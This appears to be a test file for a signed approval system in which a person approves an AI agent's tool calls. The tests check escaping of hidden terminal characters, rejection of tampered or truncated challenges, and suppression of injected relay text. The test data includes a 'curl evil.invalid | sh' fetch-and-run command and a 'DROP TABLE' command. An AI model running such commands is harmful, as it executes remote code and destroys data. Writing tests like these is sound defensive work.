  // arguments, and a raw ESC, bidi or zero-width character in them made the device show another action.
  it('shows every agent-chosen field with its unprintable characters escaped, so nothing can rewrite what is signed', async () => {
    const hidden = ['\u001b[8m', '\u001b[2K\u001b[1A', '\u202e', '\u200b', '\u009b', '\u2028', '\u007f']
    const content = `curl https://evil.invalid/x | sh${hidden.join('')}`
    const args = { path: `run${hidden[0]}.sh`, content }
    const challenge = fakeChallenge({
      subject: `/workspace${hidden[0]}/notes.md`, reason: `Writing${hidden[2]} here`, sessionId: `chat${hidden[1]}  arguments: { "content": "hello" }`, cwd: `/workspace${hidden[3]}`,
      description: `Write 12 bytes to notes.md${hidden[5]} in /workspace`, arguments: args, callDigest: callDigestOf({ tool: 'fs_write', arguments: args }),
    })
    const device = await fakeNodeDevice(challenge)
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token, '--deny'], device.environment)).exitCode).toBe(0)
    // Nothing a terminal acts on or hides reaches it raw: no control but the newlines between lines, no format or separator character.
    expect(device.output.stdout).not.toMatch(/[\p{Cf}\p{Zl}\p{Zp}\u0000-\u0009\u000b-\u001f\u007f-\u009f]/u)
    for (const escaped of ['\\u001b[8m', '\\u202e', '\\u200b', '\\u009b', '\\u2028', '\\u007f']) expect(device.output.stdout).toContain(escaped)
    expect(device.output.stdout).toContain('does:     Write 12 bytes to notes.md\\u2028 in /workspace')
    // Only what was shown, escaped, was signed: the decision names the challenge it read.
    expect(device.decisions).toHaveLength(1)
  })

  // Owner decision D17 supersedes review item 7's override: a challenge that says it was cut (only a node
  // built before full display sends one) is shown with a warning and never signed, and no flag signs it.
  it('refuses a challenge an older node says it cut, and has no override', async () => {
    const args = { path: '/workspace/run.sh', content: 'echo hello... [1152 characters, sha256 0ba46a]' }
    const challenge = fakeChallenge({ arguments: args, callDigest: callDigestOf({ tool: 'fs_write', arguments: args }), truncated: true })
    const device = await fakeNodeDevice(challenge)
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout).toContain('WARNING: a node built before full display cut this call\'s arguments')
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment)).exitCode).toBe(1)
    expect(device.output.stderr).toContain('only in part (a node built before full display), so nothing was signed')
    await expect(clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token, '--accept-truncated'], device.environment)).rejects.toThrow(/accept-truncated/)
    expect(device.decisions).toEqual([])
  })

  it('prints the whole action: node, workspace, rule, subject, directory, every effect and the arguments, a size line first past 64 KiB', async () => {
    const script = Array.from({ length: 2_000 }, (_, index) => `echo line-${index} ${'z'.repeat(40)}`).join('\n')
    const args = { command: 'sh', args: ['-c', script] }
    const challenge = fakeChallenge({
      tool: 'shell_exec', rule: 'destructive_command', subject: "sh -c '...'  # argv sha256 00", arguments: args, callDigest: callDigestOf({ tool: 'shell_exec', arguments: args }),
      effects: ['exec sh -c <script>', 'write /workspace'],
    })
    const device = await fakeNodeDevice(challenge)
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    const lines = device.output.stdout.split('\n')
    expect(lines[1]).toMatch(/^ {2}size: {5}\d+ bytes of arguments, every one shown below$/)
    for (const expected of ['  node:     fake-node', '  workspace: default', '  rule:     destructive_command', '  in:       /workspace', '  effects:  exec sh -c <script>', '            write /workspace']) expect(lines).toContain(expected)
    // Every line of the script, as JSON, and nothing cut.
    expect(device.output.stdout).toContain(`line-1999 ${'z'.repeat(40)}`)
    expect(device.output.stdout).toContain(JSON.stringify(script).slice(0, 200))
    expect(device.output.stdout).not.toMatch(/sha256 [a-f0-9]{64}\]|characters shown/)
  })
})

describe('a device verifies shared calls and asks the person before approving', () => {
  function shared(call: ShownApprovalCall): ApprovalChallenge {
    return fakeChallenge({ tool: call.tool, arguments: null, cwd: null, description: null, effects: null, callDigest: callDigestOf(call), callRef: shownCallDigestOf(call) })
  }

  const call: ShownApprovalCall = { tool: 'fs_write', arguments: { path: '/workspace/notes.md', content: 'WHOLE-SHARED-CONTENT' }, cwd: '/workspace', description: 'Write the complete contents', effects: ['write /workspace/notes.md'] }

  it('names the workspace by its name beside its id on each ask sharing a call, and by its id alone from a node that sends no name', async () => {
    const id = 'a9f9e5a2-52ac-5720-bc81-771fd12913c6'
    const challenge = { ...shared(call), workspace: id, workspaceName: 'The site' }
    const device = await fakeNodeDevice(challenge, [], { calls: { [challenge.callRef!]: call }, others: [{ ...challenge, token: 'second-token' }] })
    expect((await clientCommand(['approvals', device.url, '--workspace', 'The site'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout.split('\n').filter(line => line === `  workspace: The site (${id})`)).toHaveLength(2)

    const older = await fakeNodeDevice({ ...shared(call), workspace: id }, [], { calls: { [challenge.callRef!]: call } })
    expect((await clientCommand(['approvals', older.url, '--workspace', id], older.environment)).exitCode).toBe(0)
    expect(older.output.stdout).toContain(`  workspace: ${id}\n`)
  })

  // Fix brief 4, finding 12: the node level serves no workspace's approvals, so a device that named none signed for the node
  // and got an unexplained 401 for a key enrolled for a workspace.
  it('refuses to list or decide without a workspace, naming --workspace, and says what a 401 or 404 may mean', async () => {
    const device = await fakeNodeDevice(shared(call), [], { calls: { [shared(call).callRef!]: call } })
    for (const argv of [['approvals', device.url], ['approve', device.url, 'some-token', '--deny']]) {
      expect(await clientCommand(argv, device.environment)).toEqual({ exitCode: 1 })
      expect(device.output.stderr).toContain('Name the workspace with --workspace <name>')
      device.output.stderr = ''
    }
    expect(device.decisions).toEqual([])

    const refusing = createServer((_request, response) => { response.statusCode = 401; response.end('{}') })
    servers.push(refusing)
    await new Promise<void>(resolve => refusing.listen(0, '127.0.0.1', resolve))
    const url = `http://127.0.0.1:${(refusing.address() as { port: number }).port}`
    const key = generateSigningKey()
    expect((await clientCommand(['trust', url, 'refusing-node', key.publicKey], device.environment)).exitCode).toBe(0)
    expect(await clientCommand(['approvals', url, '--workspace', 'site'], device.environment)).toEqual({ exitCode: 1 })
    expect(device.output.stderr).toContain("The node answered HTTP 401; check that --workspace names the workspace this device's key is enrolled for")
  })

  // Fix brief 4, finding 38: a signed request names a workspace by at most 64 characters, and the client threw the schema's dump.
  it('refuses a workspace named by more than 64 characters, and a request the protocol will not carry, plainly, before signing anything', async () => {
    const device = await fakeNodeDevice(shared(call), [], { calls: { [shared(call).callRef!]: call } })
    for (const argv of [['approvals', device.url, '--workspace', 'n'.repeat(65)], ['session', 'open', device.url, '--workspace', 'n'.repeat(65)]]) {
      expect(await clientCommand(argv, device.environment)).toEqual({ exitCode: 1 })
      expect(device.output.stderr).toContain('longer than the 64 characters a signed request names; name the workspace by its id')
      device.output.stderr = ''
    }
    expect(await clientCommand(['request', 'GET', `${device.url}/workspaces/x/setup/status?${'a'.repeat(3_000)}`], device.environment)).toEqual({ exitCode: 1 })
    expect(device.output.stderr).toContain('Nothing was signed: path')
    expect(device.output.stderr).not.toContain('ZodError')
    expect(device.decisions).toEqual([])
  })

  it('shows a shared whole call once, keeps both asks visible, and confirms the complete action before signing one', async () => {
    const challenge = shared(call)
    const other = { ...challenge, token: 'second-token', subject: '/workspace/second' }
    const device = await fakeNodeDevice(challenge, [], { calls: { [challenge.callRef!]: call }, others: [other] })
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout.match(/WHOLE-SHARED-CONTENT/g)).toHaveLength(1)
    expect(device.output.stdout).toContain('second-token')
    expect(device.output.stdout).toContain('/workspace/second')
    expect(device.output.stdout).toContain('its call is the one shown whole above with fake-token')
    device.output.stdout = ''
    const confirm = vi.fn(async (prompt: string) => {
      expect(prompt).toContain('Type yes')
      for (const expected of ['WHOLE-SHARED-CONTENT', call.cwd, call.description!, call.effects[0]!]) expect(device.output.stdout).toContain(expected)
      expect(device.decisions).toEqual([])
      return true
    })
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment, { confirm })).exitCode).toBe(0)
    expect(confirm).toHaveBeenCalledOnce()
    expect(device.decisions).toHaveLength(1)
  })

  it.each(['tool', 'arguments', 'cwd', 'description', 'effects', 'missing'] as const)('refuses altered or omitted shared %s before showing relay content or signing', async (field) => {
    const challenge = shared(call)
    const changed = { ...call, ...(field === 'tool' ? { tool: 'shell_exec' } : field === 'arguments' ? { arguments: { planted: 'RELAY-CONTENT' } } : field === 'cwd' ? { cwd: 'RELAY-CONTENT' } : field === 'description' ? { description: 'RELAY-CONTENT' } : field === 'effects' ? { effects: ['RELAY-CONTENT'] } : {}) }
    const device = await fakeNodeDevice(challenge, [], { calls: field === 'missing' ? {} : { [challenge.callRef!]: changed } })
    const confirm = vi.fn(async () => true)
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout).not.toContain('RELAY-CONTENT')
    expect(device.output.stdout).toContain('shared whole action does not match')
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment, { confirm })).exitCode).toBe(1)
    expect(device.output.stderr).toContain('nothing was signed')
    expect(confirm).not.toHaveBeenCalled()
    expect(device.decisions).toEqual([])
  })

  it('refuses without a terminal or affirmative confirmation, while denial works without a terminal', async () => {
    const challenge = shared(call)
    const device = await fakeNodeDevice(challenge, [], { calls: { [challenge.callRef!]: call } })
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment, { confirm: null })).exitCode).toBe(1)
    expect(device.output.stderr).toContain('needs a person at a terminal')
    expect(device.decisions).toEqual([])
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment, { confirm: async () => false })).exitCode).toBe(1)
    expect(device.decisions).toEqual([])
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token, '--deny'], device.environment, { confirm: null })).exitCode).toBe(0)
    expect(device.decisions).toHaveLength(1)
  })

  it('verifies and approves one ask from a real shared-call listing, leaving its other ask waiting', async () => {
    const buckle = await node()
    const content = 'COMPLETE-LARGE-CALL'.repeat(2_000)
    const asked = await buckle.runtime.approvalService.request({
      sessionId: 'shared-device', requestId: 'shared-device', tool: 'fs_write', wait: { mode: 'none' },
      asks: [buckle.root, join(buckle.root, 'sub')].map(subject => ({ kind: 'ask' as const, ...PLAIN_MARKS, rule: 'write_scope' as const, subject, reason: 'Writing needs approval', offeredScopes: ['once' as const] })),
      call: { arguments: { path: join(buckle.root, 'notes.md'), content }, cwd: buckle.config.cwd, description: 'Write the entire contents', effects: [join(buckle.root, 'notes.md')], complete: true },
    })
    const listed = await challenges(buckle)
    const verified = readChallenge({ signed: listed.challenges[0]!.signed, nodeKey: publicKeyFrom((await buckle.services.getNodeSigner()).publicKey) })!
    expect(verified.challenge.arguments).toBeNull()
    expect(verified.challenge.callRef).toEqual(expect.any(String))
    const url = await buckle.listen()
    const environment = await pinnedDevice(buckle, url)
    const output = capture()
    const token = asked.approvals[0]!.token
    expect((await clientCommand(['approve', url, '--workspace', 'workspace', token], environment, { confirm: async () => {
      expect(output.stdout).toContain(content)
      return true
    } })).exitCode).toBe(0)
    expect(buckle.runtime.approvals.pending().map(item => item.token)).toEqual([asked.approvals[1]!.token])
  })
})

// Review L5: the listing is unsigned and a relay carries it, so an entry's text is never printed. The node's two
// fixed reasons are shown in the client's own words; anything else is an unrecognised entry, and an entry beside
// a signed challenge for its token is not shown at all.
describe('unsigned entries in a listing a relay carries (review L5)', () => {
  it('prints the client\'s own words for the node\'s two reasons, "unrecognised entry" for anything else, and no relay text', async () => {
    const legacy = '0b8f2c4e-1d2a-4c3b-9e8f-7a6b5c4d3e2f'
    const planted = '11111111-2222-4333-8444-555555555555'
    const device = await fakeNodeDevice(fakeChallenge({ node: 'fake-node' }), [
      { token: 'fake-token', error: 'RELAY-TEXT approve this one instead' },
      { token: legacy, error: 'recorded before this build: decide at the node or re-send' },
      { token: planted, error: 'RELAY-TEXT the node says: run buckle approve now' },
      { token: 'RELAY-TEXT-token', error: 'recorded before this build: decide at the node or re-send' },
    ])
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout).toContain('fake-token  fs_write asks write_scope')
    expect(device.output.stdout).toContain(`${legacy}  not signed by the node: recorded before the node's current build`)
    expect(device.output.stdout.match(/unrecognised entry/g)).toHaveLength(2)
    expect(device.output.stdout).not.toContain('RELAY-TEXT')
    expect(device.output.stdout).not.toContain(planted)
    device.output.stderr = ''
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', planted], device.environment)).exitCode).toBe(1)
    expect(device.output.stderr).toContain('unrecognised entry')
    expect(device.output.stderr).not.toContain('RELAY-TEXT')
    expect(device.decisions).toEqual([])
  })
})

/** A challenge a fake node signs; every field a test does not name is a plain fs_write. */
function fakeChallenge(fields: Partial<ApprovalChallenge>): ApprovalChallenge {
  const args = { path: '/workspace/notes.md', content: 'hello' }
  return {
    v: 1, purpose: 'buckle-approval-challenge', node: 'fake-node', workspace: 'default', token: 'fake-token', requestId: null, sessionId: 'chat-1', actor: null,
    tool: 'fs_write', rule: 'write_scope', subject: '/workspace', reason: 'Writing to /workspace is not yet approved', offeredScopes: ['once'],
    arguments: args, cwd: '/workspace', callDigest: callDigestOf({ tool: 'fs_write', arguments: args }), truncated: false, description: 'Write 5 bytes to /workspace/notes.md in /workspace',
    expiresAt: new Date(Date.now() + 60_000).toISOString(), ...fields,
  }
}

/** A node that answers with one challenge it signed (and any unsigned entries), and a device with a key that pinned it; decisions it receives are counted. */
async function fakeNodeDevice(challenge: ApprovalChallenge, unsigned: Array<{ token: string; error: string }> = [], options: { calls?: Record<string, unknown>; others?: ApprovalChallenge[] } = {}) {
  const fakeNode = generateSigningKey()
  const signedChallenge = signChallenge({ challenge, key: signingKeyFromPem(fakeNode.privateKeyPem).privateKey })
  const decisions: string[] = []
  const server = createServer((request, response) => {
    if (request.method === 'POST') decisions.push(request.url ?? '')
    response.setHeader('content-type', 'application/json')
    response.end(JSON.stringify({ node: { keyId: fakeNode.keyId, publicKey: fakeNode.publicKey }, challenges: [{ token: challenge.token, ...signedChallenge }, ...(options.others ?? []).map(other => ({ token: other.token, ...signChallenge({ challenge: other, key: signingKeyFromPem(fakeNode.privateKeyPem).privateKey }) })), ...unsigned], ...(options.calls ? { calls: options.calls } : {}) }))
  })
  servers.push(server)
  await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  const url = `http://127.0.0.1:${(server.address() as { port: number }).port}`
  const environment = { BUCKLE_CLIENT_DIR: join(mkdtempSync(join(process.env.TMPDIR ?? '/tmp', 'buckle-fake-device-')), 'device') }
  const output = capture()
  expect((await clientCommand(['keygen'], environment)).exitCode).toBe(0)
  expect((await clientCommand(['trust', url, 'fake-node', fakeNode.publicKey], environment)).exitCode).toBe(0)
  output.stdout = ''
  return { url, environment, decisions, output }
}

function capture(): { stdout: string; stderr: string } {
  const output = { stdout: '', stderr: '' }
  vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { output.stdout += String(chunk); return true })
  vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { output.stderr += String(chunk); return true })
  return output
}

/** A device with the owner's key that pinned this node under its URL, as `buckle keys node` prints it. */
async function pinnedDevice(buckle: Node, url: string): Promise<{ BUCKLE_CLIENT_DIR: string }> {
  const environment = { BUCKLE_CLIENT_DIR: join(mkdtempSync(join(buckle.root, 'client-')), 'device') }
  const output = capture()
  expect((await clientCommand(['keygen'], environment)).exitCode).toBe(0)
  writeFileSync(join(environment.BUCKLE_CLIENT_DIR, CLIENT_KEY_FILE), owner.privateKeyPem, { mode: 0o600 })
  output.stdout = ''
  await keysCommand({ config: buckle.config, workspaces: await buckle.services.getWorkspaces(), argv: ['node'] })
  const nodeKey = /Public key: +(ed25519:\S+)/.exec(output.stdout)![1]!
  expect((await clientCommand(['trust', url, buckle.config.serverId, nodeKey], environment)).exitCode).toBe(0)
  vi.restoreAllMocks()
  return environment
}

// Slice 7b review RRL-1: a damaged approvals.json failed the admin approvals and challenges routes, and the unhandled
// request error's log line carried the StateFileError's cause, whose V8 message quotes the file around the fault.
describe('a damaged approvals index behind the admin routes', () => {
  it('logs the failure of the approvals and challenges routes without any part of the damaged file', async () => {
    const buckle = await node()
    writeFileSync(approvalsPath(buckle.config), '{"version":1,"pending":[{"request":{"subject": MARKERSUBJ psql -c DROP TABLE accounts}}]}')
    let logged = ''
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { logged += String(chunk); return true })
    const listing = await buckle.request(buckle.setup('approvals'), { headers: { authorization: `Bearer ${ADMIN}` } })
    const path = buckle.setup('approvals/challenges')
    const challenges = await buckle.request(path, { headers: { authorization: signed(buckle, { method: 'GET', path, body: '' }) } })
    await flushLogs()
    vi.mocked(process.stderr.write).mockRestore()
    expect([listing.status, challenges.status]).toEqual([500, 500])
    expect(logged).toMatch(/Unhandled Buckle request error[^\n]*StateFileError/)
    expect(logged).not.toMatch(/MARKERSUBJ|psql|DROP|accounts/)
  })
})
